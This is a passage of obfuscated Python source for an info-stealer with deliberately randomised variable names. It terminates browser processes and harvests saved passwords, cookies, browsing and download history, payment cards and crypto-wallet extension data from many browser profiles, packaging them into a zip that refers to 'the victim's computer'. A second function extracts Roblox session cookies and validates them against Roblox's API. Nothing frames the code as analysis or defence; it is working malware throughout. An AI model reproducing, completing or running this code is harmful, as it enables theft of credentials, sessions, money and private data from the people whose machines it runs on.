        ("Orbitum",                os.path.join(RYSMRWSZCEKIVTQWNAXYZAIWAZCOCAHAHWAYJZREIOWSKAYENEJUEEKAKXAYKGEJWDXVXLATDOYATFJUFFWIBVKYABBGNJ,   "Orbitum", "User Data"),                          "orbitum.exe"),
        ("Cent Browser",           os.path.join(RYSMRWSZCEKIVTQWNAXYZAIWAZCOCAHAHWAYJZREIOWSKAYENEJUEEKAKXAYKGEJWDXVXLATDOYATFJUFFWIBVKYABBGNJ,   "CentBrowser", "User Data"),                      "centbrowser.exe"),
        ("7Star",                  os.path.join(RYSMRWSZCEKIVTQWNAXYZAIWAZCOCAHAHWAYJZREIOWSKAYENEJUEEKAKXAYKGEJWDXVXLATDOYATFJUFFWIBVKYABBGNJ,   "7Star", "7Star", "User Data"),                   "7star.exe"),
        ("Sputnik",                os.path.join(RYSMRWSZCEKIVTQWNAXYZAIWAZCOCAHAHWAYJZREIOWSKAYENEJUEEKAKXAYKGEJWDXVXLATDOYATFJUFFWIBVKYABBGNJ,   "Sputnik", "Sputnik", "User Data"),               "sputnik.exe"),
        ("Epic Privacy Browser",   os.path.join(RYSMRWSZCEKIVTQWNAXYZAIWAZCOCAHAHWAYJZREIOWSKAYENEJUEEKAKXAYKGEJWDXVXLATDOYATFJUFFWIBVKYABBGNJ,   "Epic Privacy Browser", "User Data"),             "epic.exe"),
        ("Uran",                   os.path.join(RYSMRWSZCEKIVTQWNAXYZAIWAZCOCAHAHWAYJZREIOWSKAYENEJUEEKAKXAYKGEJWDXVXLATDOYATFJUFFWIBVKYABBGNJ,   "uCozMedia", "Uran", "User Data"),                "uran.exe"),
        ("Yandex",                 os.path.join(RYSMRWSZCEKIVTQWNAXYZAIWAZCOCAHAHWAYJZREIOWSKAYENEJUEEKAKXAYKGEJWDXVXLATDOYATFJUFFWIBVKYABBGNJ,   "Yandex", "YandexBrowser", "User Data"),          "yandex.exe"),
        ("Yandex Canary",          os.path.join(RYSMRWSZCEKIVTQWNAXYZAIWAZCOCAHAHWAYJZREIOWSKAYENEJUEEKAKXAYKGEJWDXVXLATDOYATFJUFFWIBVKYABBGNJ,   "Yandex", "YandexBrowserCanary", "User Data"),    "yandex.exe"),
        ("Yandex Developer",       os.path.join(RYSMRWSZCEKIVTQWNAXYZAIWAZCOCAHAHWAYJZREIOWSKAYENEJUEEKAKXAYKGEJWDXVXLATDOYATFJUFFWIBVKYABBGNJ,   "Yandex", "YandexBrowserDeveloper", "User Data"), "yandex.exe"),
        ("Yandex Beta",            os.path.join(RYSMRWSZCEKIVTQWNAXYZAIWAZCOCAHAHWAYJZREIOWSKAYENEJUEEKAKXAYKGEJWDXVXLATDOYATFJUFFWIBVKYABBGNJ,   "Yandex", "YandexBrowserBeta", "User Data"),      "yandex.exe"),
        ("Yandex Tech",            os.path.join(RYSMRWSZCEKIVTQWNAXYZAIWAZCOCAHAHWAYJZREIOWSKAYENEJUEEKAKXAYKGEJWDXVXLATDOYATFJUFFWIBVKYABBGNJ,   "Yandex", "YandexBrowserTech", "User Data"),      "yandex.exe"),
        ("Yandex SxS",             os.path.join(RYSMRWSZCEKIVTQWNAXYZAIWAZCOCAHAHWAYJZREIOWSKAYENEJUEEKAKXAYKGEJWDXVXLATDOYATFJUFFWIBVKYABBGNJ,   "Yandex", "YandexBrowserSxS", "User Data"),       "yandex.exe"),
        ("Iridium",                os.path.join(RYSMRWSZCEKIVTQWNAXYZAIWAZCOCAHAHWAYJZREIOWSKAYENEJUEEKAKXAYKGEJWDXVXLATDOYATFJUFFWIBVKYABBGNJ,   "Iridium", "User Data"),                          "iridium.exe"),
        ("Mozilla Firefox",        os.path.join(SCQQKLTVFTSXIGLCOXLUSMMREHGQIEJBMQSJXRCRNNGXNNYLLXBBFOSEWFB, "Mozilla", "Firefox", "Profiles"),                "firefox.exe"),
        ("Safari",                 os.path.join(SCQQKLTVFTSXIGLCOXLUSMMREHGQIEJBMQSJXRCRNNGXNNYLLXBBFOSEWFB, "Apple Computer", "Safari"),                      "safari.exe"),
    ]

    LZJPUFCVOJNXDIUFEQKATUBZCYUTVDLLFCYXFIPDRTYYHGNWHAQJEXHNHIERQFFCMSMLWRMTSVJPVKSPNNVQRKTTZBSXCSCBQK = [
        '', 'Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5'
    ]

    GOUTZDDKVOIATHRMAGWCRJWJLGTOHRWUXVLBMPOVAXIMRZAZDVEXINGSCALKMOGVYYLGWSKUFHZBEFLA = [
        ("Metamask",        "nkbihfbeogaeaoehlefnkodbefgpgknn"),
        ("Metamask",        "ejbalbakoplchlghecdalmeeeajnimhm"),
        ("Binance",         "fhbohimaelbohpjbbldcngcnapndodjp"),
        ("Coinbase",        "hnfanknocfeofbddgcijnmhnfnkdnaad"),
        ("Ronin",           "fnjhmkhhmkbjkkabndcnnogagogbneec"),
        ("Trust",           "egjidjbpglichdcondbcbdnbeeppgdph"),
        ("Venom",           "ojggmchlghnjlapmfbnjholfjkiidbch"),
        ("Sui",             "opcgpfmipidbgpenhmajoajpbobppdil"),
        ("Martian",         "efbglgofoippbgcjepnhiblaibcnclgk"),
        ("Tron",            "ibnejdfjmmkpcnlpebklmnkoeoihofec"),
        ("Petra",           "ejjladinnckdgjemekebdpeokbikhfci"),
        ("Pontem",          "phkbamefinggmakgklpkljjmgibohnba"),
        ("Fewcha",          "ebfidpplhabeedpnhjnobghokpiioolj"),
        ("Math",            "afbcbjpbpfadlkmhmclhkeeodmamcflc"),
        ("Coin98",          "aeachknmefphepccionboohckonoeemg"),
        ("Authenticator",   "bhghoamapcdpbohphigoooaddinpkbai"),
        ("ExodusWeb3",      "aholpfdialjgjfhomihkjbmgjidlcdno"),
        ("Phantom",         "bfnaelmomeimhlpmgjnjophhpkkoljpa"),
        ("Core",            "agoakfejjabomempkjlepdflaleeobhb"),
        ("Tokenpocket",     "mfgccjchihfkkindfppnaooecgfneiii"),
        ("Safepal",         "lgmpcpglpngdoalbgeoldeajfclnhafa"),
        ("Solfare",         "bhhhlbepdkbapadjdnnojkbgioiodbic"),
        ("Kaikas",          "jblndlipeogpafnldhgmapagcccfchpi"),
        ("iWallet",         "kncchdigobghenbbaddojjnnaogfppfj"),
        ("Yoroi",           "ffnbelfdoeiohenkjibnmadjiehjhajb"),
        ("Guarda",          "hpglfhgfnhbgpjdenjgmdgoeiappafln"),
        ("Jaxx Liberty",    "cjelfplplebdjjenllpjcblmjkfcffne"),
        ("Wombat",          "amkmjjmmflddogmhpjloimipbofnfjih"),
        ("Oxygen",          "fhilaheimglignddkjgofkcbgekhenbh"),
        ("MEWCX",           "nlbmnnijcnlegkjjpcfjclmcfggfefdm"),
        ("Guild",           "nanjmdknhkinifnkgdcggcfnhdaammmj"),
        ("Saturn",          "nkddgncdjgjfcddamfgcmfnlhccnimig"),
        ("TerraStation",    "aiifbnbfobpmeekipheeijimdpnlpgpp"),
        ("HarmonyOutdated", "fnnegphlobjdpkhecapkijjdkgcjhkib"),
        ("Ever",            "cgeeodpfagjceefieflmdfphplkenlfk"),
        ("KardiaChain",     "pdadjkfkgcafgbceimcpbkalnfnepbnk"),
        ("PaliWallet",      "mgffkfbidihjpoaomajlbgchddlicgpn"),
        ("BoltX",           "aodkkagnadcbobfpggfnjeongemjbjca"),
        ("Liquality",       "kpfopkelmapcoipemfendmdcghnegimn"),
        ("XDEFI",           "hmeobnfnfcmdkdcmlblgagmfpfboieaf"),
        ("Nami",            "lpfcbjknijpeeillifnkikgncikgfhdo"),
        ("MaiarDEFI",       "dngmlblcodfobpdpecaadgfbcggfjfnm"),
        ("TempleTezos",     "ookjlbkiijinhpmnjffcofjonbfbgaoc"),
        ("XMR.PT",          "eigblbgjknlfbajkfhopmcojidlgcehm")
    ]
    
    try:
        for GAUSDQNQLCWPABKDAPVIELBEFTEUIEMAVYNVQNQBUSTNJWGKUKQQJEPARPTJMUTCFGVGSZNIUJ, YMHTLEVUYBVUFJPCZAYGVHBECHIBMQBYBNJNHMTENJQRHHAOIOGSCRSCQQO, v4r_proc_name in RNKPIMGHMYHQCFHGOXORHWARFXMPCQPBCICDBOQMNHSAYXAVGLEKXKLIYFTWJAHLUEZIYLJMAPSDQXRS_files:
            for v4r_proc in psutil.process_iter(['pid', 'name']):
                try:
                    if v4r_proc.name().lower() == v4r_proc_name.lower():
                        v4r_proc.terminate()
                except:
                    pass
    except:
        pass

    for GAUSDQNQLCWPABKDAPVIELBEFTEUIEMAVYNVQNQBUSTNJWGKUKQQJEPARPTJMUTCFGVGSZNIUJ, YMHTLEVUYBVUFJPCZAYGVHBECHIBMQBYBNJNHMTENJQRHHAOIOGSCRSCQQO, v4r_proc_name in RNKPIMGHMYHQCFHGOXORHWARFXMPCQPBCICDBOQMNHSAYXAVGLEKXKLIYFTWJAHLUEZIYLJMAPSDQXRS_files:
        if not os.path.exists(YMHTLEVUYBVUFJPCZAYGVHBECHIBMQBYBNJNHMTENJQRHHAOIOGSCRSCQQO):
            continue

        XCFCEOMFKGSVXTGBMYDUIIFCOVQLTCXAIYRZCAHGCUHDEODAOZIPMGRMXMBZWBOBEKDXRDHZNHFY = LKLONIPBLTJZDBIKGOPTZXGFJWNZBGEYKLERPZCTBHSRFUYATVGQYVFPJSFQAYMXPUZFGHISTLZNADOWRBWUBIULJPX(os.path.join(YMHTLEVUYBVUFJPCZAYGVHBECHIBMQBYBNJNHMTENJQRHHAOIOGSCRSCQQO, 'Local State'))
        if not XCFCEOMFKGSVXTGBMYDUIIFCOVQLTCXAIYRZCAHGCUHDEODAOZIPMGRMXMBZWBOBEKDXRDHZNHFY:
            continue

        for v4r_profile in LZJPUFCVOJNXDIUFEQKATUBZCYUTVDLLFCYXFIPDRTYYHGNWHAQJEXHNHIERQFFCMSMLWRMTSVJPVKSPNNVQRKTTZBSXCSCBQK:
            XCTSLJBZOVEMVZOIJNSQQJYPNEIYQHPIHGLCFDANTZMWVHGFIMNEHBBT = os.path.join(YMHTLEVUYBVUFJPCZAYGVHBECHIBMQBYBNJNHMTENJQRHHAOIOGSCRSCQQO, v4r_profile)
            if not os.path.exists(XCTSLJBZOVEMVZOIJNSQQJYPNEIYQHPIHGLCFDANTZMWVHGFIMNEHBBT):
                continue

        for v4r_profile in LZJPUFCVOJNXDIUFEQKATUBZCYUTVDLLFCYXFIPDRTYYHGNWHAQJEXHNHIERQFFCMSMLWRMTSVJPVKSPNNVQRKTTZBSXCSCBQK:
            XCTSLJBZOVEMVZOIJNSQQJYPNEIYQHPIHGLCFDANTZMWVHGFIMNEHBBT = os.path.join(YMHTLEVUYBVUFJPCZAYGVHBECHIBMQBYBNJNHMTENJQRHHAOIOGSCRSCQQO, v4r_profile)
            if not os.path.exists(XCTSLJBZOVEMVZOIJNSQQJYPNEIYQHPIHGLCFDANTZMWVHGFIMNEHBBT):
                continue
            
            if "extentions" in DUUWZZVBPCWSVJSWVHPSKDCQHZPXCVQWNSLBGGPUKQMZMNUAZPX:
                try: SQZYJURQUNRMPKYOCHOSNQUCJGGEBDOLRAGUFHHPTVBEBKAXCFACLEMWTJCSTBEFOERINBUMQDKDFULUWWZYXNYX(BZIYYLUWDNIZDTKATBBTZLAWXFJNPSAFVPDMUEBNXCWLEVKNRDTCKFOGVRQKNQNCFJVASKI, GOUTZDDKVOIATHRMAGWCRJWJLGTOHRWUXVLBMPOVAXIMRZAZDVEXINGSCALKMOGVYYLGWSKUFHZBEFLA, GAUSDQNQLCWPABKDAPVIELBEFTEUIEMAVYNVQNQBUSTNJWGKUKQQJEPARPTJMUTCFGVGSZNIUJ, XCTSLJBZOVEMVZOIJNSQQJYPNEIYQHPIHGLCFDANTZMWVHGFIMNEHBBT)
                except: pass
                
            if "passwords" in DUUWZZVBPCWSVJSWVHPSKDCQHZPXCVQWNSLBGGPUKQMZMNUAZPX:
                try: EVBBKBJWKNOCLWORLHAKQZGXMSJCMIUULGQAXHKUQPGAWFEIRVBCCFIIPLCGIS(GAUSDQNQLCWPABKDAPVIELBEFTEUIEMAVYNVQNQBUSTNJWGKUKQQJEPARPTJMUTCFGVGSZNIUJ, XCTSLJBZOVEMVZOIJNSQQJYPNEIYQHPIHGLCFDANTZMWVHGFIMNEHBBT, XCFCEOMFKGSVXTGBMYDUIIFCOVQLTCXAIYRZCAHGCUHDEODAOZIPMGRMXMBZWBOBEKDXRDHZNHFY)
                except: pass
            if "cookies" in DUUWZZVBPCWSVJSWVHPSKDCQHZPXCVQWNSLBGGPUKQMZMNUAZPX:
                try: WCVKMALLNXDDJJWVFQPYKBBWGBAFNWHBUTFOVMVFYKYUJTYOYBRUBHWFHGPVZNYIZEZUBSNPKEFMQGMWNBIQGGRH(GAUSDQNQLCWPABKDAPVIELBEFTEUIEMAVYNVQNQBUSTNJWGKUKQQJEPARPTJMUTCFGVGSZNIUJ, XCTSLJBZOVEMVZOIJNSQQJYPNEIYQHPIHGLCFDANTZMWVHGFIMNEHBBT, XCFCEOMFKGSVXTGBMYDUIIFCOVQLTCXAIYRZCAHGCUHDEODAOZIPMGRMXMBZWBOBEKDXRDHZNHFY)
                except: pass
            if "history" in DUUWZZVBPCWSVJSWVHPSKDCQHZPXCVQWNSLBGGPUKQMZMNUAZPX:
                try: KTFUUFVTPCZMQDSCYSXWVHHVOYNLZFXQCJGFGXJSEQHYFSQDUEKQKLNYJOIXUQMHKSFXDKNUMBZBDOJYKHFJXEJNYPJKZPEVUEZ(GAUSDQNQLCWPABKDAPVIELBEFTEUIEMAVYNVQNQBUSTNJWGKUKQQJEPARPTJMUTCFGVGSZNIUJ, XCTSLJBZOVEMVZOIJNSQQJYPNEIYQHPIHGLCFDANTZMWVHGFIMNEHBBT)
                except: pass
            if "downloads" in DUUWZZVBPCWSVJSWVHPSKDCQHZPXCVQWNSLBGGPUKQMZMNUAZPX:
                try: GBTCLPCMBJGPDNMKXWKWSGABUPXDNYIFYFAXLIEYJWJYQYICVSRHEVYEJVRFYWOXNYNTPNFXPULIF(GAUSDQNQLCWPABKDAPVIELBEFTEUIEMAVYNVQNQBUSTNJWGKUKQQJEPARPTJMUTCFGVGSZNIUJ, XCTSLJBZOVEMVZOIJNSQQJYPNEIYQHPIHGLCFDANTZMWVHGFIMNEHBBT)
                except: pass
            if "cards" in DUUWZZVBPCWSVJSWVHPSKDCQHZPXCVQWNSLBGGPUKQMZMNUAZPX:
                try: JFXJJAWQKYYWYJUVWQXGUQZNVZMTSIZBSTQGZHNWDMZNGGEXYRKRZPC(GAUSDQNQLCWPABKDAPVIELBEFTEUIEMAVYNVQNQBUSTNJWGKUKQQJEPARPTJMUTCFGVGSZNIUJ, XCTSLJBZOVEMVZOIJNSQQJYPNEIYQHPIHGLCFDANTZMWVHGFIMNEHBBT, XCFCEOMFKGSVXTGBMYDUIIFCOVQLTCXAIYRZCAHGCUHDEODAOZIPMGRMXMBZWBOBEKDXRDHZNHFY)
                except: pass

            if GAUSDQNQLCWPABKDAPVIELBEFTEUIEMAVYNVQNQBUSTNJWGKUKQQJEPARPTJMUTCFGVGSZNIUJ not in GEBLFRLNBGLDQRXNXKFFJPSOVQXPWAKOJAMQZWTCIVTBKBBMQIMOBH:
                GEBLFRLNBGLDQRXNXKFFJPSOVQXPWAKOJAMQZWTCIVTBKBBMQIMOBH.append(GAUSDQNQLCWPABKDAPVIELBEFTEUIEMAVYNVQNQBUSTNJWGKUKQQJEPARPTJMUTCFGVGSZNIUJ)

    if "passwords" in DUUWZZVBPCWSVJSWVHPSKDCQHZPXCVQWNSLBGGPUKQMZMNUAZPX:
        if not GADSLHVMPAEHVZTWXGZQCGTIOPYUHJLIAYWBHPHRAADSYPMTGDAYGSOCEMOHODLWO:
            GADSLHVMPAEHVZTWXGZQCGTIOPYUHJLIAYWBHPHRAADSYPMTGDAYGSOCEMOHODLWO.append("No passwords was saved on the victim's computer.")
        GADSLHVMPAEHVZTWXGZQCGTIOPYUHJLIAYWBHPHRAADSYPMTGDAYGSOCEMOHODLWO = "\n".join(GADSLHVMPAEHVZTWXGZQCGTIOPYUHJLIAYWBHPHRAADSYPMTGDAYGSOCEMOHODLWO)
    if "cookies" in DUUWZZVBPCWSVJSWVHPSKDCQHZPXCVQWNSLBGGPUKQMZMNUAZPX:
        if not BHSOSIMMFFHXGLUPANDELKTNNDPYJLNLTRTZFNMOSDRSXXTYQJWVH:
            BHSOSIMMFFHXGLUPANDELKTNNDPYJLNLTRTZFNMOSDRSXXTYQJWVH.append("No cookies was saved on the victim's computer.")
        BHSOSIMMFFHXGLUPANDELKTNNDPYJLNLTRTZFNMOSDRSXXTYQJWVH   = "\n".join(BHSOSIMMFFHXGLUPANDELKTNNDPYJLNLTRTZFNMOSDRSXXTYQJWVH)
    if "history" in DUUWZZVBPCWSVJSWVHPSKDCQHZPXCVQWNSLBGGPUKQMZMNUAZPX:
        if not YYVJUYIAMXFGVSWAEYTCHNSHLIOHZFPQPBSEKXTEGYWMYQNKECLLEFPSZBFHTYHNFXXTLOAUK:
            YYVJUYIAMXFGVSWAEYTCHNSHLIOHZFPQPBSEKXTEGYWMYQNKECLLEFPSZBFHTYHNFXXTLOAUK.append("No history was saved on the victim's computer.")
        YYVJUYIAMXFGVSWAEYTCHNSHLIOHZFPQPBSEKXTEGYWMYQNKECLLEFPSZBFHTYHNFXXTLOAUK   = "\n".join(YYVJUYIAMXFGVSWAEYTCHNSHLIOHZFPQPBSEKXTEGYWMYQNKECLLEFPSZBFHTYHNFXXTLOAUK)
    if "downloads" in DUUWZZVBPCWSVJSWVHPSKDCQHZPXCVQWNSLBGGPUKQMZMNUAZPX:
        if not VMNETNYFVUCYOYEBSVBZVAWBDWUAYOEGSMIXDZEPOGEXJTYSPYCJYWHGGGCXYZMKEOHMVCZRXJLISOGVERC:
            VMNETNYFVUCYOYEBSVBZVAWBDWUAYOEGSMIXDZEPOGEXJTYSPYCJYWHGGGCXYZMKEOHMVCZRXJLISOGVERC.append("No downloads was saved on the victim's computer.")
        VMNETNYFVUCYOYEBSVBZVAWBDWUAYOEGSMIXDZEPOGEXJTYSPYCJYWHGGGCXYZMKEOHMVCZRXJLISOGVERC = "\n".join(VMNETNYFVUCYOYEBSVBZVAWBDWUAYOEGSMIXDZEPOGEXJTYSPYCJYWHGGGCXYZMKEOHMVCZRXJLISOGVERC)
    if "cards" in DUUWZZVBPCWSVJSWVHPSKDCQHZPXCVQWNSLBGGPUKQMZMNUAZPX:
        if not GWYGINKOADFBAKSNJCQHCZIPKBQSFGGCBKJNBFAWMXGFREHYVYMMLWYDYTMXKSRCEJXEURUKR:
            GWYGINKOADFBAKSNJCQHCZIPKBQSFGGCBKJNBFAWMXGFREHYVYMMLWYDYTMXKSRCEJXEURUKR.append("No cards was saved on the victim's computer.")
        GWYGINKOADFBAKSNJCQHCZIPKBQSFGGCBKJNBFAWMXGFREHYVYMMLWYDYTMXKSRCEJXEURUKR     = "\n".join(GWYGINKOADFBAKSNJCQHCZIPKBQSFGGCBKJNBFAWMXGFREHYVYMMLWYDYTMXKSRCEJXEURUKR)
    
    if FVMPTXUPBJAZIZSCOKDEGXDTDRYKJAUSWMTSPGWAKEZUJDZRSQCHZFHLETSSOEKOWPHQMRSRVUJHGPMEYQ != None:
        BZIYYLUWDNIZDTKATBBTZLAWXFJNPSAFVPDMUEBNXCWLEVKNRDTCKFOGVRQKNQNCFJVASKI.writestr(f"Passwords ({FVMPTXUPBJAZIZSCOKDEGXDTDRYKJAUSWMTSPGWAKEZUJDZRSQCHZFHLETSSOEKOWPHQMRSRVUJHGPMEYQ}).txt", GADSLHVMPAEHVZTWXGZQCGTIOPYUHJLIAYWBHPHRAADSYPMTGDAYGSOCEMOHODLWO)

    if WQZLIJYQXTGWJWSDKFNFRKZDBOWYXZHYOFOYKXLWEGPQIJWLQTKYKBGXYOXOMLVQAIHGBTMUGWVSNACSYEYBSQI != None:
        BZIYYLUWDNIZDTKATBBTZLAWXFJNPSAFVPDMUEBNXCWLEVKNRDTCKFOGVRQKNQNCFJVASKI.writestr(f"Cookies ({WQZLIJYQXTGWJWSDKFNFRKZDBOWYXZHYOFOYKXLWEGPQIJWLQTKYKBGXYOXOMLVQAIHGBTMUGWVSNACSYEYBSQI}).txt", BHSOSIMMFFHXGLUPANDELKTNNDPYJLNLTRTZFNMOSDRSXXTYQJWVH)

    if PTDCJYGBMXGRBVIUTDWJJUZVMPVDKLLCRBGGQSNUDQKDADDQWTLXUFKNRGYZRGVFE != None:
        BZIYYLUWDNIZDTKATBBTZLAWXFJNPSAFVPDMUEBNXCWLEVKNRDTCKFOGVRQKNQNCFJVASKI.writestr(f"Cards ({PTDCJYGBMXGRBVIUTDWJJUZVMPVDKLLCRBGGQSNUDQKDADDQWTLXUFKNRGYZRGVFE}).txt", GWYGINKOADFBAKSNJCQHCZIPKBQSFGGCBKJNBFAWMXGFREHYVYMMLWYDYTMXKSRCEJXEURUKR)

    if FGAWRSBTJJOCBDBEQKKRXNTRINKASWQCARWLJHURTCUIRESYUPNEUHFQBVUWPHKRXDUELSLERYTTMXFSKSIK != None:
        BZIYYLUWDNIZDTKATBBTZLAWXFJNPSAFVPDMUEBNXCWLEVKNRDTCKFOGVRQKNQNCFJVASKI.writestr(f"Browsing History ({FGAWRSBTJJOCBDBEQKKRXNTRINKASWQCARWLJHURTCUIRESYUPNEUHFQBVUWPHKRXDUELSLERYTTMXFSKSIK}).txt", YYVJUYIAMXFGVSWAEYTCHNSHLIOHZFPQPBSEKXTEGYWMYQNKECLLEFPSZBFHTYHNFXXTLOAUK)

    if KSGGLTPYPNERECKZBJCCCNRECEYUQSYPBAEEYCJBQDDJJVBFPXOMYQITONAFOZNHYQKSGOFTYHKGQGZWFLTRF != None:
        BZIYYLUWDNIZDTKATBBTZLAWXFJNPSAFVPDMUEBNXCWLEVKNRDTCKFOGVRQKNQNCFJVASKI.writestr(f"Download History ({KSGGLTPYPNERECKZBJCCCNRECEYUQSYPBAEEYCJBQDDJJVBFPXOMYQITONAFOZNHYQKSGOFTYHKGQGZWFLTRF}).txt",VMNETNYFVUCYOYEBSVBZVAWBDWUAYOEGSMIXDZEPOGEXJTYSPYCJYWHGGGCXYZMKEOHMVCZRXJLISOGVERC)

    return KXWMDENTRODMBBONQIACTTHKXYQXBWBKVTBZFOKHSDMWJMDCLRVMYUPMFIS, FVMPTXUPBJAZIZSCOKDEGXDTDRYKJAUSWMTSPGWAKEZUJDZRSQCHZFHLETSSOEKOWPHQMRSRVUJHGPMEYQ, WQZLIJYQXTGWJWSDKFNFRKZDBOWYXZHYOFOYKXLWEGPQIJWLQTKYKBGXYOXOMLVQAIHGBTMUGWVSNACSYEYBSQI, FGAWRSBTJJOCBDBEQKKRXNTRINKASWQCARWLJHURTCUIRESYUPNEUHFQBVUWPHKRXDUELSLERYTTMXFSKSIK, KSGGLTPYPNERECKZBJCCCNRECEYUQSYPBAEEYCJBQDDJJVBFPXOMYQITONAFOZNHYQKSGOFTYHKGQGZWFLTRF, PTDCJYGBMXGRBVIUTDWJJUZVMPVDKLLCRBGGQSNUDQKDADDQWTLXUFKNRGYZRGVFE

def AEAZTDKSDUKQBDRCPVURNGHDKQXNITPRMONFUFZCQEEBFNMWLWSXWUZQTLCTAMBWDYIRRCMCWQ(BZIYYLUWDNIZDTKATBBTZLAWXFJNPSAFVPDMUEBNXCWLEVKNRDTCKFOGVRQKNQNCFJVASKI):
    import browser_cookie3
    import requests
    import json

    JOJDEDLVMOHKVOFBCXXGNPMOSUAOLZIBAUDCDYQCERVUJCTXOJSKCAUCPZXEWSUWPKUZXRSHDDZDMFSXGSJL = ""
    DLFKMHFEMHCOOSUIFACPADFHHDLIRCDPPPLWPNBGZSKNCFKYNBSSE = 0
    VTRXWRNTUVSZGZRVAVVSBPAPBNGNKJWCFMRBPWWBKZIPUAULFGBOPQCKEVSJBMXOCSYCJXZZJBROKAPGAFLRRA = []
    

    def TUJKDMRXRRAXPACJAXXDMANKBAFQFABTMWBCGPOTQEMPWAUIVZLHZFEZZUIBLDRSLYZMMRTLBDDNMPFXH(BDGYPMFZJXCXLQIZGVJPCEYVZZSGNUQHADMJSVMGGPPNFKCQUNABBIELZRZNSKOCMLQJMMQSXSEVGNOH):
        try:
            QZDAANGDZDFHLRFSQNDJZQRKOURDBZCEEUUNLQBLDNIPQKNDCDQLPHUHRKXDZDVUCXFCE = BDGYPMFZJXCXLQIZGVJPCEYVZZSGNUQHADMJSVMGGPPNFKCQUNABBIELZRZNSKOCMLQJMMQSXSEVGNOH()
            QZDAANGDZDFHLRFSQNDJZQRKOURDBZCEEUUNLQBLDNIPQKNDCDQLPHUHRKXDZDVUCXFCE = str(QZDAANGDZDFHLRFSQNDJZQRKOURDBZCEEUUNLQBLDNIPQKNDCDQLPHUHRKXDZDVUCXFCE)
            DOVCGBQSCKRWYDRULJNLNGRJKGQBFKSTVNPVYHQNILHMXSMHBILKZBBHNOQODMXPFQDE = QZDAANGDZDFHLRFSQNDJZQRKOURDBZCEEUUNLQBLDNIPQKNDCDQLPHUHRKXDZDVUCXFCE.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
            BTGQSECLSSVWGVJVUBVHKANWHMJOLYERGYUKUTJBMQLLGJJTVKIDFDCIXOIOTOXO = BDGYPMFZJXCXLQIZGVJPCEYVZZSGNUQHADMJSVMGGPPNFKCQUNABBIELZRZNSKOCMLQJMMQSXSEVGNOH.__name__
            return DOVCGBQSCKRWYDRULJNLNGRJKGQBFKSTVNPVYHQNILHMXSMHBILKZBBHNOQODMXPFQDE, BTGQSECLSSVWGVJVUBVHKANWHMJOLYERGYUKUTJBMQLLGJJTVKIDFDCIXOIOTOXO
        except:
            return None, None

    def MicrosoftEdge():
        return browser_cookie3.edge(domain_name="roblox.com")

    def GoogleChrome():
        return browser_cookie3.chrome(domain_name="roblox.com")

    def Firefox():
        return browser_cookie3.firefox(domain_name="roblox.com")

    def Opera():
        return browser_cookie3.opera(domain_name="roblox.com")
    
    def OperaGX():
        return browser_cookie3.opera_gx(domain_name="roblox.com")

    def Safari():
        return browser_cookie3.safari(domain_name="roblox.com")

    def Brave():
        return browser_cookie3.brave(domain_name="roblox.com")

    ELSFJVDNLZSGPVVJZXWGKLWMKLQWDKOHXCTCYHJWKPHEWARYPIVIZPNMLAWISFYSGRWIRCDKDTCLBZPRKIFBGYWRXIYMYF = [MicrosoftEdge, GoogleChrome, Firefox, Opera, OperaGX, Safari, Brave]
    for v4r_br0ws3r in ELSFJVDNLZSGPVVJZXWGKLWMKLQWDKOHXCTCYHJWKPHEWARYPIVIZPNMLAWISFYSGRWIRCDKDTCLBZPRKIFBGYWRXIYMYF:
        v4r_c00ki3, BTGQSECLSSVWGVJVUBVHKANWHMJOLYERGYUKUTJBMQLLGJJTVKIDFDCIXOIOTOXO = TUJKDMRXRRAXPACJAXXDMANKBAFQFABTMWBCGPOTQEMPWAUIVZLHZFEZZUIBLDRSLYZMMRTLBDDNMPFXH(v4r_br0ws3r)
        if v4r_c00ki3:
            if v4r_c00ki3 not in VTRXWRNTUVSZGZRVAVVSBPAPBNGNKJWCFMRBPWWBKZIPUAULFGBOPQCKEVSJBMXOCSYCJXZZJBROKAPGAFLRRA:
                DLFKMHFEMHCOOSUIFACPADFHHDLIRCDPPPLWPNBGZSKNCFKYNBSSE += 1
                VTRXWRNTUVSZGZRVAVVSBPAPBNGNKJWCFMRBPWWBKZIPUAULFGBOPQCKEVSJBMXOCSYCJXZZJBROKAPGAFLRRA.append(v4r_c00ki3)
                try:
                    ZLXDFYYQZOKTRMXZDYRQEVJGUDSEZDGAVLQVCRBZEMCEMMEVMWKMAVXCKOMVUILADTWASSCXZJDOWOBDDNUHWBZYNHSOBUVAS = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": v4r_c00ki3})
                    GFJMHVXRMXVWTVSAIDJJMYDCHSXRTXUQCEHQDFCZUBEHCMNUOYCIRGDHOOHXHULBWGZSXNYNCIZRYQELSXQDKJMYYCCVGPDZD = json.loads(ZLXDFYYQZOKTRMXZDYRQEVJGUDSEZDGAVLQVCRBZEMCEMMEVMWKMAVXCKOMVUILADTWASSCXZJDOWOBDDNUHWBZYNHSOBUVAS.text)
                except:
                    GFJMHVXRMXVWTVSAIDJJMYDCHSXRTXUQCEHQDFCZUBEHCMNUOYCIRGDHOOHXHULBWGZSXNYNCIZRYQELSXQDKJMYYCCVGPDZD = {"None": "None"}

                FQNREPMGISCGFECQUWMIAUBPSMMQLBSOMACEYLGXDWLRJVSTKMKKRLMIDFKVHVYGEBVVWOMHCXJXKODKMBIBDGJBQJJXDOJZ = GFJMHVXRMXVWTVSAIDJJMYDCHSXRTXUQCEHQDFCZUBEHCMNUOYCIRGDHOOHXHULBWGZSXNYNCIZRYQELSXQDKJMYYCCVGPDZD.get('id', "None")
                FJDQTZENYXAPFKSMQTJMAMLEJBILJTRWOVJBECBFXRBIMOEMKBDEOCDXBROPKZPPYWJPVGXWHNKLBQXOWGMFIMNDYUGR = GFJMHVXRMXVWTVSAIDJJMYDCHSXRTXUQCEHQDFCZUBEHCMNUOYCIRGDHOOHXHULBWGZSXNYNCIZRYQELSXQDKJMYYCCVGPDZD.get('displayName', "None")
                WSSBGLYEEGIPCVWABYRYKHJSZPEGLNCNGGURQICCTHOVRBZXWNHEHAYRJIJVRROJANMRVAOMY = GFJMHVXRMXVWTVSAIDJJMYDCHSXRTXUQCEHQDFCZUBEHCMNUOYCIRGDHOOHXHULBWGZSXNYNCIZRYQELSXQDKJMYYCCVGPDZD.get('name', "None")
